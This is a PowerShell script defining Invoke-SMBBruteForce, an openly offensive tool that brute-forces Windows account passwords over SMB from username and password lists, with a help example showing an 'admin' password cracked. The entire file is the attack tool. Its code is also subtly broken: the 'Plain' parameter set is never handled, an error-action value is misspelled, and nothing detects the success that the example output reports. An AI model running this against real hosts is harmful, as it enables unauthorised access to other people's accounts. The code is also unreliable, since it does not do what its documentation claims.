function Invoke-SMBBruteForce

{
<#
.SYNOPSIS

    This will use SMB to brute force a specific account when pointed at a local target. 
    
.DESCRIPTION

    Author: Wbbigdave
    License: GNU GPL v3
    Required Dependancies: None
    Optional Dependancies: None
    Version: 1.0


.Example

    PS C:\> Invoke-SMBBruteForce -Target 192.168.0.10 -Username "admin" -PasswordFile password.txt

    [*]Trying to authenticate against \\192.168.0.10
    [*]Loaded 2000 passwords from password file.
    [*]Starting brute force operation.
    [*]Success! Password: ilovemushrooms
    [*]Completed.

 .Parameter Target

    A single target host, either an IP address or a hostname. 

.Parameter Username

    A single username in plaintext to be brute forced. This should be a loacl user account. 

.Parameter UsernameFile

    A file on the local host which contains a list of usernames. This can either be in txt line separated, or CSV comma
    separated.     

.Parameter Password

    A comma separated list of passwords to use against the target account. 

.Parameter PasswordFile

    A file on the local host which contains a list of passwords. This can either be in txt line separated, or CSV comma
    separated. 

#>


    [CmdletBinding(DefaultParameterSetName = "Plain")] Param(

    [Parameter(Mandatory=$true)]
    [String] $Target,

    [Parameter(ParameterSetName = "Files", mandatory=$false)]
    [Parameter(ParameterSetName = "Plain", Mandatory=$true)]
    [String] $Username,

    [Parameter(ParameterSetName = "Files", mandatory=$false)]
    [String] $UsernameFile,

    [Parameter(ParameterSetName = "Files", mandatory=$false)]
    [Parameter(ParameterSetName = "Plain", Mandatory=$true)]
    [String] $Password,

    [Parameter(ParameterSetName = "Files", mandatory=$false)]
    [String] $PasswordFile
    )

    Process
    {

        Write-Host "[*]Trying to authenticate against \\$target"

        $SetName = $PsCmdlet.ParameterSetName
        if($SetName -eq "Files")
        {
            if(!$Username)
            {
                foreach($user in get-content $UsernameFile)
                {
                    if(!$PasswordFile)
                    {
                        try 
                        {
                             new-smbmapping -remotepath \\$target -username $user -password $Password -EA SilentlyContinue
                        }
                        catch 
                        {
                             write-host "Unknown error Occured"
                             throw
                        }

                    }
                    else
                    {
                        foreach($pw in get-content $PasswordFile)
                        {
                            try
                            {
                                new-smbmapping -remotepath \\$target -username $user -password $pw -EA SiltentlyContinue
                            }
                            catch
                            {
                                Write-Host "Unknown Error Occured"
                                throw
                            }
                        }
                    }
                
                }
            }
            else
            {
                $user = $username
                if(!$PasswordFile)
                {
                    try 
                    {
                         new-smbmapping -remotepath \\$target -username $user -password $Password -EA SilentlyContinue
                    }
                    catch 
                    {
                         write-host "Unknown error Occured"
                         throw
                    }

                }
                else
                {
                    foreach($pw in get-content $PasswordFile)
                    {
                        try
                        {
                            new-smbmapping -remotepath \\$target -username $user -password $pw -EA SiltentlyContinue
                        }
                        catch
                        {
                            Write-Host "Unknown Error Occured"
                            throw
                        }
                    }
                }
            
            }
        }
    }

}